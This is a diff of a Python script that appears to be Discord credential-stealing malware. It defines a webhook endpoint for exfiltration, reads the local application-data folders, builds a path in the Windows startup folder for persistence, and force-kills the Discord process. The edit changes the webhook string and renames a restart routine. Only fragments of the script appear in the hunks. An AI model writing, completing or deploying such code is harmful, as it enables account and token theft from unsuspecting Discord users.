@@ -1,15 +1,10 @@
-import ntpath
-import os
-import re
-import time
-import subprocess
+import ntpath, os, re, time, subprocess, httpx
 from sys import argv
-import httpx
 
 
 class Start:
     def __init__(self):
-        self.Webhook = "¤¤¤¤£££373830"
+        self.Webhook = "¤¤¤¤discord£££destroyer3738@darknosy30"
         self.local = os.getenv("localappdata")
         self.startup_loc = ntpath.join(
             os.getenv("appdata"),
@@ -52,13 +47,14 @@ class Start:
                             except PermissionError:
                                 pass
 
-def Restart():
+def Close():
     for proc in os.popen('tasklist').readlines():
         if 'Discord.exe' in proc:
             pid = int(proc.split()[1])
             subprocess.run(['taskkill', '/F', '/PID', str(pid)])
             break
     time.sleep(3)
+    # no restart, pr if you want one so bad
 
 Start()
-Restart()
+Close()
